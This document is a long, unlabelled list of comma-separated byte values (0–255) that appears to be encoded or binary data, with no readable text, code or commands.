137,103,170,242,217,227,24,130,21,175,179,197,45,48,73,29,148,42,60,26,159,221,93,235,27,84,106,137,171,184,165,209,125,118,145,22,187,187,115,104,190,181,188,56,5,159,208,61,248,198,91,221,45,125,82,173,225,226,181,77,124,11,251,216,108,170,252,192,204,45,93,236,186,157,47,86,146,9,176,234,48,38,130,160,254,218,44,82,247,4,237,50,60,59,229,195,140,70,204,194,126,90,142,41,116,58,196,137,80,174,27,114,128,25,104,54,13,134,28,91,156,219,29,149,4,247,228,246,4,122,238,161,131,248,52,44,110,164,13,142,81,115,143,53,77,189,148,74,17,147,92,239,17,188,124,251,208,88,146,56,22,154,174,228,10,175,132,4,200,107,16,27,232,157,199,3,122,40,168,220,90,156,41,113,81,252,196,128,16,96,181,166,96,45,177,67,211,222,233,220,135,50,84,236,185,66,233,242,216,39,58,1,170,238,250,22,136,11,200,47,207,254,106,65,88,193,175,224,90,168,19,98,191,130,101,200,136,42,106,142,49,61,3,194,191,177,179,252,15,177,219,31,18,138,43,25,164,210,102,73,219,69,29,147,40,64,16,191,127,119,157,4,153,158,239,121,77,229,16,187,186,204,145,21,189,183,128,63,48,94,232,31,15,128,46,36,67,230,253,183,199,110,184,161,192,167,143,175,95,72,166,42,76,15,193,184,140,87,57,199,145,11,185,81,217,123,97,28,31,136,39,100,94,11,188,161,217,121,40,242,239,36,101,121,8,196,104,8,58,242,230,51,255,49,47,215,250,126,144,68,236,149,168,194,137,83,204,175,201,8,210,90,182,148,223,60,34,20,67,212,62,41,27,222,38,242,169,113,184,205,80,102,50,34,101,143,63,46,106,149,45,13,73,216,236,196,49,251,219,7,190,180,120,5,152,138,201,96,35,11,114,212,21,117,12,137,18,119,73,210,57,3,227,25,184,161,190,173,126,224,203,5,113,200,114,158,20,191,120,161,155,242,18,148,47,29,116,170,239,247,31,110,89,219,244,128,236,161,155,76,236,36,106,130,75,175,96,142,4,162,13,162,254,241,148,177,154,223,17,123,61,247,202,142,24,188,150,224,72,173,84,112,21,64,91,183,205,136,99,139,103,73,232,48,59,60,246,233,74,31,132,72,165,127,51,22,107,178,182,188,49,216,38,60,251,251,211,139,40,41,107,69,141,197,22,62,100,163,254,219,46,69,228,93,105,136,80,219,90,155,251,20,200,171,237,41,102,198,142,10,158,142,6,185,178,78,109,113,142,51,32,94,121,132,44,91,181,117,116,229,224,68,250,164,203,55,127,78,26,187,143,83,2,229,22,191,197,90,190,202,144,8,202,146,39,23,129,212,228,135,53,220,99,213,53,132,221,66,23,90,91,203,149,61,22,28,123,100,169,135,111,110,116,254,170,106,140,187,125,14,66,134,143,39,138,80,249,31,153,30,173,243,17,215,112,154,62,64,42,138,165,225,65,54,80,245,13,172,211,90,246,17,144,246,233,73,26,115,99,187,187,87,204,145,34,126,58,16,78,225,99,142,50,110,167,224,53,72,251,229,45,117,115,113,184,136,33,127,98,145,10,117,150,20,190,160,236,48,72,18,100,195,82,109,48,53,175,148,61,30,160,208,94,152,164,194,104,118,153,21,158,223,32,50,88,178,209,72,158,25,192,177,105,145,83,243,222,68,249,169,217,184,103,174,187,99,143,234,116,209,138,78,218,113,174,137,210,55,9,147,72,16,162,26,176,225,244,18,133,89,176,102,193,200,154,174,2,223,105,194,156,1,142,69,239,14,81,250,203,135,38,4,230,90,229,220,122,36,80,247,14,83,20,169,10,206,81,203,250,182,69,250,115,85,133,221,181,3,20,148,38,132,116,148,39,120,76,204,103,167,111,11,153,24,151,242,232,219,93,131,212,222,29,55,55,14,219,42,247,1,198,239,235,34,121,76,217,8,219,69,44,86,201,152,15,188,99,197,117,174,255,220,215,246,167,0,13,201,63,72,189,52,253,127,74,146,204,79,60,243,131,51,202,255,213,109,114,103,53,82,222,50,240,8,170,76,120,112,143,126,57,192,111,97,138,91,208,109,112,109,75,11,162,26,145,50,235,227,154,158,245,114,252,222,82,192,158,2,198,72,95,239,40,86,101,255,206,156,26,106,152,246,226,75,249,127,37,132,53,79,194,191,87,101,106,55,34,10,97,142,127,42,223,31,6,73,246,12,112,26,119,140,46,31,22,155,227,150,143,242,229,14,65,45,75,233,204,116,100,29,6,200,136,199,17,136,57,67,251,34,111,23,166,219,50,33,57,44,84,126,4,145,6,173,101,195,138,46,253,224,32,232,165,234,35,248,126,62,17,141,74,14,208,98,198,116,184,173,90,221,56,27,102,106,153,12,86,125,40,66,248,130,108,143,31,44,84,196,254,98,178,201,5,96,148,175,160,206,69,40,86,126,131,93,216,34,135,48,112,144,54,221,13,29,21,144,161,101,208,127,41,115,94,198,138,46,17,5,252,2,200,13,8,179,232,54,21,139,218,182,107,161,196,21,23,37,0,147,221,35,107,117,125,146,68,8,191,171,210,97,187,207,103,149,62,51,10,207,75,255,223,46,14,12,230,66,9,76,74,239,61,55,17,167,228,38,32,130,52,193,84,230,210,9,157,248,206,104,174,241,58,85,249,255,218,74,27,188,206,149,63,20,140,94,216,68,255,156,45,99,169,3,246,17,102,195,119,87,225,74,159,23,136,70,147,179,149,239,225,87,219,76,212,66,203,139,34,121,3,157,125,9,227,31,221,209,47,62,75,13,159,54,50,203,136,55,31,89,144,39,98,82,137,4,174,180,79,5,195,129,5,202,100,30,2,211,104,42,232,255,207,73,43,18,53,252,129,67,165,146,253,51,15,49,41,231,169,12,105,179,216,86,242,2,226,0,15,40,68,9,209,34,5,182,206,105,110,40,101,134,173,75,190,128,63,174,231,28,120,32,120,90,60,169,223,66,153,162,205,6,157,214,43,127,109,138,96,223,86,149,46,57,83,231,50,236,224,162,134,62,151,130,69,81,20,133,98,199,149,63,48,20,179,171,222,214,37,227,216,120,94,33,5,145,23,189,126,89,219,106,197,165,6,234,32,114,144,74,35,144,77,0,211,59,255,206,114,15,43,56,57,51,30,99,106,183,176,234,28,118,144,40,115,64,44,55,58,12,155,220,11,195,129,228,217,9,129,151,159,39,68,23,115,33,55,34,102,208,56,43,108,130,102,56,170,109,138,219,8,156,196,20,104,155,29,68,158,178,206,11,20,236,71,176,216,32,114,152,253,8,198,185,169,163,181,62,231,125,103,22,112,27,93,151,233,63,37,110,109,119,45,102,105,79,208,244,6,143,156,173,42,78,28,152,242,28,133,203,82,151,175,75,62,22,113,24,103,123,63,59,29,41,130,99,199,84,241,199,54,26,22,160,192,8,105,248,27,162,230,26,74,34,131,71,42,129,112,73,25,128,91,83,114,87,170,176,230,30,39,121,87,9,237,16,58,207,28,161,44,108,87,0,154,154,192,165,134,164,60,88,127,105,107,144,61,228,223,31,5,210,44,197,50,165,219,112,162,229,28,48,222,22,109,102,125,56,7,153,35,82,223,252,206,100,108,180,197,75,38,73,8,162,150,215,64,12,221,17,159,15,152,36,252,95,77,236,183,117,87,149,161,192,145,58,235,168,149,37,6,35,189,213,7,211,48,67,36,87,247,248,36,105,99,116,0,161,79,241,121,73,144,255,179,150,235,236,233,242,42,106,148,67,53,82,140,199,88,166,188,190,145,43,228,192,111,98,136,96,175,116,144,10,166,114,36,216,219,183,54,154,53,84,208,90,116,17,124,59,252,185,132,35,69,31,95,170,104,67,123,242,113,8,34,100,217,106,130,54,67,35,254,114,89,162,199,90,160,206,69,30,96,196,109,52,254,202,108,191,109,177,83,7,228,32,51,87,230,19,182,92,183,223,102,204,151,46,220,216,39,59,254,248,227,51,204,7,154,225,10,206,90,223,179,12,118,226,189,28,22,10,173,254,244,223,33,247,188,50,50,201,85,134,218,191,229,34,139,89,248,251,2,242,28,143,70,37,142,57,73,31,154,22,178,224,156,253,241,42,110,152,34,78,131,36,65,235,58,51,68,236,250,163,4,183,194,73,231,207,119,110,31,161,245,176,188,210,121,49,216,6,210,255,55,130,136,239,26,93,242,182,204,141,53,85,217,93,107,43,44,42,47,110,152,22,120,87,142,66,240,234,172,197,115,14,90,231,196,250,124,49,43,154,253,14,194,125,113,59,15,84,230,33,4,241,6,126,62,22,173,189,208,129,91,202,126,192,253,37,149,218,219,251,242,158,90,24,196,60,52,13,211,236,54,75,233,29,104,179,203,25,139,60,10,166,232,222,48,82,233,4,209,145,16,154,233,16,143,64,41,121,101,63,242,216,38,123,73,8,159,157,195,125,83,8,157,82,142,71,33,77,177,145,73,186,147,18,195,165,201,154,88,212,87,183,225,19,129,231,20,133,216,252,0,122,216,227,251,202,203,177,81,224,76,225,74,141,173,99,169,127,30,89,142,182,131,126,18,185,198,140,80,233,46,28,189,45,75,12,148,255,111,124,77,128,2,237,180,42,235,228,17,246,47,217,72,219,219,30,83,181,220,77,248,208,77,170,240,203,42,107,155,238,174,80,135,167,95,36,172,75,233,74,16,147,78,8,200,131,83,66,118,188,211,64,251,121,95,166,118,33,146,197,249,129,35,84,30,98,175,224,39,120,1,82,118,111,45,20,119,52,195,92,244,177,218,98,182,210,99,192,99,140,201,82,183,137,94,199,137,29,103,94,210,36,246,82,54,28,18,117,86,201,171,237,211,16,182,184,150,181,62,191,255,88,58,106,31,167,128,55,44,92,202,161,13,151,162,133,30,84,178,224,47,245,15,109,28,224,138,32,6,154,231,23,194,111,128,92,242,37,101,168,240,5,201,123,121,104,155,4,212,116,140,65,63,54,43,76,159,143,1,171,173,167,184,133,31,158,6,203,87,184,106,175,142,195,39,11,203,77,139,233,31,96,121,94,93,179,235,45,49,69,10,224,47,13,205,137,249,64,55,63,5,177,158,185,148,44,109,54,26,137,83,192,163,207,15,108,130,70,47,27,189,94,164,242,237,209,112,114,107,34,6,156,219,30,85,175,160,206,140,42,3,228,237,168,122,18,181,144,194,68,14,147,222,47,235,11,232,254,212,92,236,68,40,121,109,140,69,47,121,135,88,203,114,125,106,182,199,146,75,17,153,255,133,221,23,107,111,99,134,27,94,149,240,222,21,188,175,211,65,251,161,11,150,8,141,52,8,89,211,69,190,147,188,110,96,170,7,230,35,92,221,254,44,90,203,65,67,208,253,122,16,188,122,3,130,85,188,100,157,161,215,72,21,132,112,141,101,166,172,153,145,238,104,166,93,188,198,133,56,75,178,14,171,199,105,201,64,162,76,69,238,155,217,43,58,38,68,20,208,135,64,23,162,239,10,186,187,161,241,254,187,157,6,249,30,167,253,252,228,38,122,157,51,104,184,199,126,89,201,138,94,210,129,79,198,26,96,142,3,164,194,105,114,87,169,179,149,46,60,55,195,11,74,244,159,189,125,34,250,184,211,195,40,110,117,122,15,157,46,98,159,16,57,168,115,122,12,117,86,152,153,220,102,11,82,241,236,21,62,255,211,115,66,197,151,21,127,251,107,56,150,147,135,130,216,132,15,180,194,101,138,46,98,145,22,96,187,115,21,159,227,229,28,35,57,233,177,156,217,35,70,220,27,93,220,54,59,180,81,189,120,70,34,100,175,86,175,191,160,131,204,71,198,10,58,7,120,113,95,232,2,113,149,10,57,31,169,243,237,66,2,135,34,1,84,60,86,136,51,67,248,232,31,64,48,60,58,54,30,59,110,27,152,30,130,58,28,95,240,5,238,19,147,57,44,101,112,181,117,249,156,3,192,120,62,57,2,212,36,112,67,195,107,44,42,47,32,150,12,92,234,42,112,91,222,1,120,41,166,58,55,80,180,179,175,244,22,136,50,236,168,181,143,3,166,188,123,62,51,2,86,88,172,136,65,238,58,12,81,244,235,176,17,49,74,11,165,251,246,252,203,105,120,104,123,252,188,124,59,253,183,137,19,180,154,249,170,166,127,95,118,83,9,186,177,143,77,58,177,189,197,173,236,49,47,66,237,164,193,108,107,108,106,111,97,201,57,213,105,62,129,169,19,65,17,155,117,245,182,174,23,28,125,131,115,154,39,75,239,231,182,139,12,139,14,133,32,79,0,186,153,167,179,100,48,212,237,5,204,231,200,92,13,56,39,135,104,188,191,133,65,240,156,219,28,90,161,203,78,196,161,176,113,140,216,102,220,92,225,97,167,113,205,108,105,228,178,186,206,146,60,64,2,200,91,91,157,217,37,65,236,233,244,18,95,99,182,90,224,111,165,6,243,243,142,130,103,132,17,239,147,22,185,210,124,129,62,20,119,7,152,230,251,190,117,79,195,166,163,150,27,42,109,198,158,26,184,164,122,171,190,162,219,69,30,100,243,134,63,63,63,53,84,196,130,45,231,250,191,114,90,161,202,79,255,197,180,173,156,19,75,121,0,99,85,31,114,144,38,79,227,21,226,186,162,22,186,198,161,222,52,22,41,51,21,112,94,149,240,223,100,188,157,41,133,100,85,108,107,110,100,200,117,127,232,158,146,248,198,92,229,49,75,216,52,245,18,137,44,63,232,18,206,132,43,64,206,74,41,252,200,217,142,5,186,206,246,228,23,159,215,69,32,112,62,178,152,231,249,14,184,184,146,8,121,139,59,75,181,171,4,229,17,147,11,132,98,152,19,66,44,60,20,136,38,176,89,203,123,47,221,69,41,128,76,123,93,189,160,201,37,53,197,133,52,95,147,76,214,60,165,179,78,223,196,99,92,88,69,83,218,114,170,236,69,32,136,110,172,229,84,243,15,219,105,174,254,2,228,86,232,48,117,237,12,195,180,220,81,251,226,13,70,221,25,101,205,123,109,114,103,93,225,54,82,170,206,154,35,87,193,129,33,139,30,130,243,24,118,102,146,8,12,71,3,210,41,238,16,199,166,219,207,99,171,213,3,253,197,111,13,123,244,237,154,226,223,207,222,134,61,67,71,37,116,157,37,124,111,169,253,248,252,1,242,20,167,1,247,13,188,195,178,223,71,35,148,70,19,190,189,189,173,238,40,129,96,214,120,142,58,74,29,160,5,233,70,50,78,11,209,129,96,213,118,137,73,29,169,6,211,126,134,196,133,84,247,20,183,192,172,205,76,136,22,108,107,184,184,183,147,4,135,91,164,210,105,87,198,178,214,25,68,49,78,151,244,172,221,9,145,111,28,132,80,175,93,198,167,7,183,58,34,113,132,245,38,72,230,167,174,93,177,76,202,40,246,107,225,46,107,190,191,165,9,235,51,75,23,188,184,187,197,177,219,82,0,4,232,44,115,177,234,37,132,113,174,217,108,194,192,163,15,213,108,160,25,186,14,167,244,37,128,98,196,135,31,14,131,37,64,62,38,70,236,25,79,24,76,126,252,115,115,251,224,96,180,105,13,172,238,237,248,247,182,146,160,140,12,139,13,200,108,157,158,231,244,138,55,205,69,131,151,231,176,216,87,210,76,233,32,47,101,171,139,180,161,251,195,18,159,247,179,108,157,233,194,133,117,87,1,181,186,170,0,206,48,100,197,70,70,245,36,142,64,41,87,196,109,167,203,123,8,212,62,2,83,169,107,135,203,80,150,171,76,62,22,178,228,81,239,40,135,102,176,229,80,10,197,167,6,217,89,229,71,127,85,234,66,38,114,149,10,224,79,185,140,97,148,29,130,121,99,113,161,13,108,215,58,21,134,57,50,227,69,241,9,95,209,71,232,163,186,56,33,252,186,88,102,25,214,78,12,212,125,110,172,246,26,151,49,103,203,133,103,190,12,173,221,97,226,88,219,89,191,191,177,146,54,23,119,246,193,36,94,71,218,247,136,179,8,185,202,150,56,59,72,52,86,225,82,254,1,226,80,5,227,59,74,46,105,170,245,19,190,169,254,14,32,112,148,56,85,5,213,107,146,27,119,86,228,45,103,143,62,149,102,103,13,60,160,137,156,152,230,254,182,205,95,206,230,115,65,128,228,168,116,243,244,42,111,110,115,1,161,132,61,171,175,119,8,53,129,78,13,224,98,189,191,198,160,4,237,61,56,61,65,64,134,63,37,136,105,178,207,129,47,201,17,124,60,251,9,198,139,23,121,40,132,90,227,9,175,248,23,170,182,250,215,93,198,111,73,243,218,221,24,102,123,136,73,2,177,170,148,65,28,116,165,253,203,26,125,143,64,219,209,4,184,37,49,103,161,24,103,155,227,196,99,132,34,146,26,51,100,178,177,238,34,92,104,185,149,29,35,147,46,101,122,126,61,41,73,185,169,71,186,181,167,157,224,249,70,93,222,42,41,117,97,185,79,200,172,180,190,158,37,95,126,121,132,9,254,204,157,35,130,99,171,203,90,240,28,80,254,191,157,1,252,219,11,210,122,39,166,204,94,172,200,133,245,235,65,47,62,16,82,118,77,200,87,169,178,152,229,61,228,181,16,211,235,253,134,5,206,82,119,38,86,62,22,113,26,96,142,3,166,189,120,72,22,120,94,74,156,111,22,6,74,92,182,227,76,221,37,118,139,197,29,87,169,181,214,75,252,111,32,79,194,104,182,150,31,106,89,202,228,228,55,32,53,26,74,85,49,96,164,188,150,68,50,72,238,54,73,230,177,90,161,203,79,12,172,123,140,59,20,196,160,225,216,104,134,74,156,227,94,158,255,220,106,145,233,58,65,208,168,205,153,46,99,194,140,39,70,44,104,107,171,181,186,170,2,201,63,54,77,172,23,122,85,197,124,106,70,247,30,153,0,204,30,19,116,82,183,136,21,111,97,203,100,193,13,254,160,98,61,157,148,146,20,200,150,249,210,229,245,137,47,211,54,227,196,0,32,114,171,255,231,67,39,114,169,245,9,225,70,20,193,185,187,203,233,23,160,22,181,211,105,176,164,127,49,26,96,210,85,222,202,248,132,35,69,222,94,183,93,215,49,70,8,233,21,91,227,70,195,207,90,244,28,150,39,95,174,176,224,32,124,6,234,40,119,69,48,80,215,123,122,83,128,110,118,122,11,214,90,237,205,137,37,109,51,94,189,189,104,183,155,11,89,234,30,161,193,191,47,49,43,100,197,54,42,139,22,144,56,88,252,12,232,63,33,111,156,44,127,133,128,117,116,108,191,182,170,205,28,25,101,129,45,40,54,13,135,88,177,182,115,76,143,47,6,164,21,151,25,87,234,74,160,227,63,15,192,106,143,90,239,19,155,171,106,112,94,148,243,214,43,45,102,99,88,225,214,185,255,17,73,249,225,160,114,63,6,246,159,231,51,51,85,172,198,178,229,49,66,181,78,196,97,138,16,125,54,12,211,85,129,111,105,130,89,136,106,181,172,200,41,241,218,31,80,190,116,83,181,144,255,178,153,43,78,151,41,64,6,96,137,227,178,78,128,78,243,114,40,49,102,35,95,207,133,79,212,0,12,193,194,170,184,148,33,48,114,156,248,227,217,226,9,147,245,206,67,230,253,182,140,9,147,244,210,57,3,228,14,158,153,220,234,159,136,209,88,212,208,16,122,138,183,164,2,235,29,108,56,34,158,23,113,107,158,163,131,37,63,240,222,20,115,86,173,167,184,134,27,92,155,221,85,188,148,184,127,1,89,88,96,173,212,207,18,115,176,111,118,134,58,63,238,3,253,249,203,91,204,23,39,58,1,170,175,161,204,74,207,65,236,233,56,35,115,13,71,219,30,83,182,141,8,150,237,232,248,200,168,234,250,208,110,80,23,118,123,74,227,4,148,42,75,136,236,207,48,139,198,128,117,125,132,21,149,57,46,105,110,136,87,176,173,215,26,133,93,125,225,228,44,71,227,253,250,189,163,184,180,119,38,64,171,173,169,180,145,252,188,123,60,249,194,103,201,133,42,63,32,57,90,180,206,38,21,197,7,99,101,154,97,234,148,104,154,36,82,209,79,194,139,79,200,102,172,152,236,169,180,145,251,190,117,80,189,187,155,12,64,173,169,181,144,254,180,146,248,24,160,240,47,115,152,185,65,235,237,231,63,13,180,73,123,251,190,116,82,2,202,34,135,33,117,123,143,33,56,75,14,105,240,40,107,129,62,193,172,186,175,111,171,219,104,93,217,54,59,200,158,254,251,172,236,252,231,196,169,225,88,156,45,229,15,144,54,79,153,1,6,165,224,58,78,7,190,155,23,143,41,92,212,87,204,113,150,68,34,126,241,219,30,84,179,149,239,224,80,208,109,53,88,211,130,28,176,115,152,46,24,26,140,69,242,245,19,159,13,126,139,213,57,40,107,158,38,126,70,172,201,173,176,200,163,25,139,54,69,6,197,135,84,215,46,228,3,164,194,105,114,89,163,5,176,204,21,183,181,220,16,206,4,215,102,186,162,144,20,179,182,203,106,128,17,217,90,248,237,165,254,0,162,31,26,120,135,57,65,6,170,162,21,28,134,19,203,146,20,142,215,230,252,185,132,34,71,216,38,135,75,253,193,121,39,128,86,8,229,55,204,104,205,135,33,118,118,156,250,173,237,41,25,225,85,229,20,132,36,38,76,4,229,205,85,215,113,137,97,130,138,246,219,76,222,253,235,0,193,34,5,158,212,50,24,102,125,54,84,212,4,231,33,167,7,209,255,207,155,228,42,125,141,44,82,240,4,202,120,128,82,211,137,88,195,129,0,110,102,125,54,12,139,15,130,39,57,3,166,3,208,133,28,166,74,149,39,74,253,135,54,99,205,112,164,192,188,10,85,230,11,185,81,197,129,115,129,120,60,82,141,75,21,98,61,37,121,85,205,140,53,74,186,137,50,94,188,216,117,134,224,23,134,90,134,199,50,63,12,148,235,49,23,148,229,44,16,61,181,145,253,185,132,33,76,203,147,18,167,112,30,86,174,165,4,192,156,144,168,117,79,195,102,196,131,248,4,172,213,89,244,243,193,177,219,4,17,140,33,100,160,251,136,87,185,177,103,199,147,55,4,242,9,172,254,243,232,194,168,199,136,227,71,223,31,128,17,188,141,54,215,114,135,102,98,200,102,169,127,120,113,161,186,192,127,94,95,217,80,9,136,106,46,52,34,129,111,58,30,175,168,229,86,238,9,187,182,179,190,157,17,160,234,67,41,81,217,248,131,36,67,230,252,187,127,51,98,187,173,177,170,148,64,37,44,79,1,176,187,194,153,42,0,202,166,13,186,138,32,126,32,166,201,120,47,50,54,247,19,167,169,214,116,126,128,34,108,178,194,175,157,250,3,174,181,192,93,187,189,95,60,209,99,161,214,35,138,14,174,149,28,65,202,86,107,110,100,130,40,53,15,129,117,113,46,115,140,235,45,55,56,210,120,77,229,69,15,201,35,153,39,87,197,51,212,50,25,99,133,30,85,176,159,211,54,12,219,79,202,94,196,79,25,119,133,1,133,118,243,157,183,163,69,61,155,84,216,107,127,73,233,246,241,29,95,161,253,166,195,36,66,233,243,213,49,28,90,162,201,82,184,198,100,157,190,104,58,47,5,166,15,169,228,247,12,230,206,88,224,43,106,108,135,112,173,219,67,179,83,182,142,5,159,209,58,0,175,162,200,85,237,204,26,154,173,53,139,110,51,59,26,245,115,60,16,215,251,210,114,116,144,249,223,104,196,148,25,51,212,50,25,100,130,41,51,22,107,109,102,123,142,63,20,196,179,218,245,142,5,158,212,51,22,109,102,192,140,57,185,66,234,242,217,104,147,35,251,101,60,249,195,102,196,130,250,14,189,184,131,99,141,51,64,63,19,98,206,134,3,16,148,61,56,53,93,146,71,23,95,222,77,9,143,67,236,250,240,193,187,190,108,185,187,190,113,165,237,50,255,0,238,217,114,146,56,1,242,3,236,219,114,157,244,239,181,76,202,80,191,114,89,163,196,161,211,78,172,159,148,34,46,44,125,95,194,93,216,129,251,210,116,111,160,202,109,189,198,144,38,12,73,211,54,11,140,9,147,246,12,111,49,85,123,202,204,170,126,88,196,248,107,87,193,199,43,65,39,87,232,242,246,36,146,45,80,141,197,96,142,4,164,195,101,129,107,120,95,87,162,152,147,169,109,133,76,103,72,210,147,198,115,146,22,169,174,193,193,185,182,179,100,65,234,240,222,21,113,92,154,41,83,135,89,176,181,69,171,66,156,115,4,48,94,166,236,183,208,106,187,99,217,102,154,253,160,21,156,37,51,96,70,46,111,130,14,197,157,239,34,24,131,125,138,94,222,87,119,142,33,122,246,139,14,133,32,77,199,90,161,11,152,252,114,38,210,238,127,224,156,247,32,148,5,174,218,93,80,125,54,11,141,7,153,227,6,237,33,111,178,233,56,218,222,21,112,94,217,63,30,11,54,201,83,180,146,67,24,151,243,228,230,68,6,201,99,150,180,187,135,54,100,195,114,141,55,97,187,9,7,22,119,200,118,82,119,74,209,60,67,6,110,177,212,115,82,0,211,99,147,4,103,160,218,116,149,13,165,148,175,162,201,83,181,144,253,183,201,92,181,118,65,174,212,24,110,186,168,230,242,24,191,65,0,234,14,193,102,153,59,75,255,216,245,140,10,144,254,182,142,6,157,21,86,126,111,44,184,4,4,113,130,71,111,7,129,65,71,171,194,165,221,84,174,194,190,195,152,12,88,100,129,43,44,43,46,36,68,54,72,248,22,189,186,84,112,94,149,240,34,101,173,94,84,179,149,239,44,93,200,97,154,195,166,194,118,124,80,158,19,111,128,134,93,157,229,46,22,197,63,49,92,200,155,6,214,0,108,105,115,87,246,255,226,19,132,7,224,51,66,247,172,198,178,215,15,69,220,194,82,174,124,55,1,208,109,119,87,110,141,80,95,80,192,112,95,221,74,0,184,149,210,139,88,187,64,27,108,78,225,98,200,106,201,152,23,151,24,243,99,244,50,60,40,68,197,109,143,66,239,239,17,142,227,70,222,25,33,76,202,79,11,176,114,173,241,239,166,236,250,177,242,160,217,69,19,165,15,195,117,31,110,185,148,49,86,223,101,194,133,60,229,82,244,245,31,162,11,118,146,21,156,145,186,129,42,49,104,169,227,16,140,238,41,72,4,152,3,251,18,196,119,15,176,173,154,62,224,64,29,62,157,148,241,219,30,160,0,222,31,95,117,149,13,188,184,199,137,189,149,71,28,97,155,14,154,193,173,175,4,78,209,98,146,83,188,139,62,229,92,125,107,193,72,56,177,170,220,34,103,167,11,212,125,139,73,251,225,71,41,122,136,109,185,168,217,73,13,224,80,19,144,9,179,165,254,240,251,122,63,240,221,99,186,177,164,210,30,168,2,245,13,172,208,12,168,13,188,96,160,234,58,63,250,6,20,163,236,247,36,74,223,66,252,154,31,88,7,76,237,45,69,19,177,219,77,127,86,237,238,244,3,186,94,211,61,92,81,215,56,47,102,145,40,44,52,48,92,162,228,254,228,245,249,195,71,26,57,173,94,99,67,229,0,174,227,15,156,193,96,81,233,217,43,128,85,222,9,211,130,184,74,7,169,224,221,51,109,140,155,162,254,196,143,224,135,71,255,190,224,90,239,33,112,131,252,214,55,40,90,48,226,63,1,214,9,222,198,142,38,101,160,207,96,173,205,130,117,153,45,107,176,200,131,115,158,30,150,46,73,247,240,24,190,179,237,12,147,38,155,56,79,29,160,246,241,26,191,203,148,79,10,180,184,170,254,219,52,86,146,118,133,40,11,172,216,120,150,80,30,156,5,198,154,50,103,213,115,154,6,193,143,8,85,174,164,195,163,207,91,131,26,36,112,67,235,66,16,174,155,32,169,131,57,62,16,188,118,105,203,165,18,183,202,133,106,162,206,82,112,6,91,158,212,49,102,174,211,63,2,141,82,230,39,105,109,47,61,224,43,131,115,125,77,10,118,194,151,18,106,219,104,140,207,111,113,78,27,38,70,0,224,61,71,27,109,66,12,147,26,158,48,131,138,101,168,230,82,254,11,224,51,58,5,94,150,238,229,75,0,222,30,99,104,193,152,16,172,165,143,32,26,125,143,54,242,235,10,219,93,160,21,232,38,98,149,72,220,42,97,158,179,212,57,100,54,49,97,169,230,57,66,22,24,115,120,87,230,54,82,5,196,163,204,89,212,69,191,178,158,55,191,141,19,151,46,58,45,29,97,168,190,216,84,220,74,203,21,140,243,227,51,29,128,118,138,55,48,88,205,112,136,86,207,101,133,221,24,102,124,120,45,249,254,129,185,0,15,77,235,10,38,226,241,240,58,226,62,71,167,214,132,87,144,16,155,42,113,102,196,217,83,220,40,94,211,114,165,12,176,175,223,77,6,192,188,168,223,66,228,202,109,91,161,138,16,125,55,72,187,78,253,131,179,18,218,239,7,182,33,240,197,117,156,105,56,62,3,209,10,174,253,219,172,110,154,240,11,107,227,55,68,25,100,57,9,248,242,2,217,32,29,117,38,95,221,67,15,176,153,178,183,84,188,155,33,95,190,117,85,109,104,119,73,19,91,111,154,171,57,127,144,203,114,119,223,183,114,111,188,74,229,59,27,156,213,75,37,151,61,55,76,0,248,247,207,79,122,232,179,148,242,217,107,141,217,98,148,11,83,174,114,6,81,117,110,146,149,192,106,187,36,92,216,107,157,234,191,206,123,147,55,17,138,64,210,141,75,233,17,81,123,62,243,213,48,32,79,192,173,179,175,101,122,16,42,228,187,156,9,49,236,230,71,128,73,17,191,160,227,213,77,30,149,246,218,79,144,188,121,68,227,6,155,222,21,174,176,184,74,202,32,251,115,15,159,254,82,137,15,221,233,8,210,84,239,220,55,97,206,74,222,68,177,89,162,200,87,237,4,208,244,124,250,194,105,114,165,243,6,166,204,47,103,144,46,114,118,244,225,59,227,35,156,27,115,174,232,40,99,180,31,222,130,136,63,55,6,247,169,243,25,148,56,47,91,135,37,102,190,123,77,248,217,2,232,249,238,60,194,114,122,115,133,113,158,228,186,61,246,204,76,23,155,14,144,14,103,188,142,49,104,164,172,233,51,16,155,51,83,202,170,243,6,204,121,208,205,182,236,21,181,142,93,118,139,78,242,29,129,103,99,147,29,171,251,10,207,104,157,176,198,178,97,150,15,181,192,193,175,178,81,121,67,229,254,255,228,51,30,98,108,182,185,172,218,50,227,35,156,30,106,158,33,123,39,120,135,20,141,92,173,234,44,73,145,250,192,111,160,215,67,205,60,189,167,160,215,126,90,208,52,85,253,110,157,10,208,51,51,109,178,196,138,64,2,117,145,13,181,91,220,255,91,82,87,78,157,246,228,83,91,87,62,145,132,114,152,221,85,150,151,158,114,253,142,35,95,220,161,87,55,165,126,187,60,252,187,125,119,46,244,11,88,52,144,93,99,170,207,215,205,47,56,82,112,151,28,155,213,78,28,165,237,17,171,192,59,63,4,210,6,220,0,89,88,68,136,239,0,201,165,101,58,149,139,152,53,77,189,182,113,5,83,84,87,129,76,229,75,82,67,115,241,153,105,27,28,91,156,218,105,149,195,165,200,129,85,0,208,44,112,158,185,248,242,1,224,56,54,226,94,217,63,13,90,93,151,232,247,201,82,183,137,94,198,140,20,128,18,206,130,61,53,42,83,178,181,231,60,15,174,240,12,115,148,52,14,163,32,96,208,124,121,133,49,74,155,47,111,176,221,62,28,43,125,118,66,240,56,13,149,30,104,86,235,229,10,177,223,38,106,101,136,53,23,153,62,52,56,47,91,195,142,46,101,164,231,253,117,78,196,97,139,14,132,34,144,44,118,76,70,180,215,113,93,130,30,164,170,193,136,97,203,85,247,66,22,145,7,6,218,54,74,235,16,136,120,249,231,65,22,179,148,76,168,246,13,181,213,89,221,16,226,192,145,80,252,207,126,79,227,15,230,179,186,133,221,22,109,104,188,153,18,46,205,4,161,202,80,8,184,87,231,2,212,93,231,26,78,9,212,24,209,85,4,239,245,129,50,39,9,212,68,17,73,25,122,111,174,195,12,153,21,84,206,154,32,57,220,73,216,230,30,105,0,2,235,10,172,127,240,222,22,110,101,126,51,21,173,179,172,97,89,58,180,43,218,174,195,189,203,155,39,125,241,154,224,13,134,27,92,154,226,81,231,70,211,129,226,90,234,14,105,179,211,76,10,94,177,241,32,97,154,22,170,107,44,42,49,28,90,161,203,78,15,180,193,116,96,114,151,1,8,186,108,106,10,106,108,136,110,173,208,131,36,157,182,205,139,62,58,42,107,65,169,179,148,241,219,30,83,180,218,74,22,106,190,2,107,165,207,109,55,38,147,25,243,153,26,111,140,232,109,153,31,136,24,28,94,253,179,185,211,38,71,249,8,173,214,44,46,226,9,149,240,34,99,188,185,154,2,123,123,72,236,162,150,131,219,183,54,153,55,76,231,22,65,170,177,155,220,26,95,144,255,240,233,11,69,173,60,176,56,179,34,102,210,126,72,229,55,71,146,181,144,255,178,154,225,11,142,75,